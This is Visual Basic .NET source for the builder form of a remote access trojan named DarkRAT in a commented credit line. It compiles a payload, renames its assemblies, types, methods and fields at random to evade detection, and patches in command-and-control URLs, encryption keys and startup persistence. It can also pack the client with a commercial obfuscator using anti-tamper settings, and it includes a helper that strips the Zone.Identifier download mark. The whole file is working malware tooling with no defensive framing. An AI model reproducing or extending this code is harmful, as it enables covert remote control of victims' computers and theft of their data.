Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class MainForm
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        BackgroundWorker1.RunWorkerAsync()
    End Sub

    Private Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'MsgBox("DarkRAT v0.1 By DarkSpider Special Thanks to, NYAN CAT" + Environment.NewLine + "https://github.com/NYAN-x-CAT" + Environment.NewLine + Environment.NewLine + "[1] This Client works only with .NET 2+" + Environment.NewLine + "[2] You don't need to crypt your stub, Just upload your stub without any installation or modification")
        Control.CheckForIllegalCrossThreadCalls = False

    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click

    End Sub


    Function RandomString(minCharacters As Integer, maxCharacters As Integer)
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Static r As New Random
        Dim chactersInString As Integer = r.Next(minCharacters, maxCharacters)
        Dim sb As New StringBuilder
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function

    Private Sub gen_edkey_Click(sender As Object, e As EventArgs) Handles gen_edkey.Click

        edkey.Text = RandomString(32, 32)

    End Sub

    Private Sub Label4_Click(sender As Object, e As EventArgs)

    End Sub

    Sub DeleteZoneIdentifier(ByVal filePath As String)
        Try : My.Computer.FileSystem.DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
    End Sub

    Public Function encrypt(ByVal input As String) As String
        Try
            Dim key As String = edkey.Text
            Dim rj As RijndaelManaged = New RijndaelManaged()
            rj.Padding = PaddingMode.Zeros
            rj.Mode = CipherMode.CBC
            rj.KeySize = 256
            rj.BlockSize = 256
            Dim ky As Byte() = Encoding.ASCII.GetBytes(key)
            Dim inp As Byte() = Encoding.ASCII.GetBytes(input)
            Dim res As Byte()
            Dim enc As ICryptoTransform = rj.CreateEncryptor(ky, ky)

            Using ms As MemoryStream = New MemoryStream()

                Using cs As CryptoStream = New CryptoStream(ms, enc, CryptoStreamMode.Write)
                    cs.Write(inp, 0, inp.Length)
                    cs.FlushFinalBlock()
                    cs.Close()
                    cs.Dispose()
                End Using

                res = ms.ToArray()
                ms.Close()
                ms.Dispose()
            End Using

            Return Convert.ToBase64String(res).Replace("+", "~")
        Catch
            Return Nothing
        End Try
    End Function

    Public Function decrypt(ByVal input As String) As String
        Try
            Dim key As String = edkey.Text
            Dim rj As RijndaelManaged = New RijndaelManaged()
            rj.Padding = PaddingMode.Zeros
            rj.Mode = CipherMode.CBC
            rj.KeySize = 256
            rj.BlockSize = 256
            Dim ky As Byte() = Encoding.ASCII.GetBytes(key)
            Dim inp As Byte() = Convert.FromBase64String(input)
            Dim res As Byte() = New Byte(inp.Length - 1) {}
            Dim dec As ICryptoTransform = rj.CreateDecryptor(ky, ky)

            Using ms As MemoryStream = New MemoryStream(inp)

                Using cs As CryptoStream = New CryptoStream(ms, dec, CryptoStreamMode.Read)
                    cs.Read(res, 0, res.Length)
                    cs.Close()
                    cs.Dispose()
                End Using

                ms.Close()
                ms.Dispose()
            End Using

            Return Encoding.UTF8.GetString(res).Trim().Replace(vbNullChar, "")
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function

    Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged

    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged

    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork

        Try
            Dim URL As String = ""
            For i As Integer = 0 To RichTextBox1.Lines.Length - 1
                'URL += Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(RichTextBox1.Lines(i))) + "#,#"
                URL += Convert.ToString(RichTextBox1.Lines(i)) + "#,#"
            Next
            ProgressBar1.Value = 10

            If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe") Then
                Shell("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe """ & Application.StartupPath + "\Misc\Payload\Payload.il""" & " /out=""" & Application.StartupPath + "\Misc\Payload\Payload.exe""" & "", AppWinStyle.Hide, False, -1)
                Threading.Thread.Sleep(3000)
            Else
                MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical)
                Exit Sub
            End If
            ProgressBar1.Value = 20
            Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Misc\Payload\Payload.exe")
            definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(3, 5)) + " " + Randomi(rand.Next(3, 5)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                definition2.Name = Randomi(rand.Next(3, 10))
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    definition3.Namespace = Randomi(rand.Next(3, 10))
                    definition3.Name = Randomi(rand.Next(3, 10))
                    For Each F In definition3.Fields
                        F.Name = Randomi(rand.Next(3, 10))
                    Next
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
                            definition4.Name = Randomi(rand.Next(3, 10))
                            For Each P As ParameterDefinition In definition4.Parameters
                                P.Name = Randomi(rand.Next(3, 10))
                            Next
                        ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                ProgressBar1.Value = 35
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString

                                        If (str = "%reqinterval%") Then
                                            current.Operand = NumericUpDown1.Value.ToString
                                        End If

                                        If (str = "%URL%") Then
                                            URL = URL.ToString
                                            current.Operand = URL.Substring(0, URL.Length - 3)
                                            'MsgBox(URL.ToString)
                                        End If

                                        If (str = "%visibility%") Then
                                            current.Operand = visibility.Checked.ToString
                                        End If

                                        If (str = "%edkey%") Then
                                            current.Operand = edkey.Text
                                            'MsgBox(edkey.Text.ToString)
                                        End If

                                        If (str = "%spkey%") Then
                                            current.Operand = spkey.Text
                                            'MsgBox(edkey.Text.ToString)
                                        End If

                                        If (str = "%debug%") Then
                                            current.Operand = debug.Checked.ToString
                                            'MsgBox(edkey.Text.ToString)
                                        End If

                                        If (str = "%reqintervalType%") Then

                                            If (intervalMinute.Checked.ToString = "True") Then
                                                current.Operand = "minutes"
                                            End If
                                            If (intervalSecound.Checked.ToString = "True") Then
                                                current.Operand = "secounds"
                                            End If

                                            'MsgBox(current.Operand.ToString)
                                        End If

                                            If (str = "%Startup%") Then
                                            current.Operand = CheckBox1.Checked.ToString
                                        End If

                                    End If
                                Loop
                            Finally
                            End Try

                        End If
                    Next
                Next
            Next

            ProgressBar1.Value = 50

            Dim Command = "/C dotNET_Reactor.exe -file """ & Application.StartupPath & "\client.exe" & """ -control_flow_obfuscation 1 -compression 1 -flow_level 9 -suppressildasm 1 -obfuscation 1 -antitamp  1 -embed 1 -resourceencryption 1 -satellite_assemblies """ & Application.StartupPath & "\Misc\Stub\stub.exe" & """ -targetfile """ & Application.StartupPath & "\client.exe" & """"
            'MsgBox(Command)

            definition.Write(Application.StartupPath + "\" + "client.exe")
            If (crypt.Checked) Then
                ProgressBar1.Value = 80

                IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", My.Resources.dotNET_Reactor)
                Dim process As New Process()
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                process.StartInfo.FileName = "cmd.exe"
                process.StartInfo.UseShellExecute = True
                process.StartInfo.CreateNoWindow = True
                process.StartInfo.WorkingDirectory = IO.Path.GetTempPath
                process.StartInfo.Arguments = Command
                process.Start()
                process.WaitForExit()

            End If

            ProgressBar1.Value = 100
            MsgBox("Your Client Has been Created Successfully", vbInformation, "DONE!")
            My.Settings.Save()
            definition.Dispose()
            'Try : IO.File.Delete(Application.StartupPath & "\Payload\Payload.exe") : Catch : End Try
        Catch ex1 As Exception
            MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
            Return
        End Try
    End Sub

    Private Sub BackgroundWorker1_ProgressChanged(sender As Object, e As System.ComponentModel.ProgressChangedEventArgs) Handles BackgroundWorker1.ProgressChanged
        ProgressBar1.Value = e.ProgressPercentage
    End Sub

    Private Sub TabPage1_Click(sender As Object, e As EventArgs) Handles TabPage1.Click

    End Sub

    Private Sub TabPage2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub WebBrowser1_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs)

    End Sub


    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub Label10_Click(sender As Object, e As EventArgs) Handles Label10.Click, Label11.Click

    End Sub

    Private Sub crypt_CheckedChanged(sender As Object, e As EventArgs) Handles crypt.CheckedChanged, debug.CheckedChanged, intervalSecound.CheckedChanged, intervalMinute.CheckedChanged



        If (intervalSecound.Checked) Then
            If (intervalMinute.Checked) Then
                intervalSecound.Checked = False
            End If
        Else

            If (intervalSecound.Checked) Then
                intervalMinute.Checked = False
            End If

        End If

    End Sub
End Class
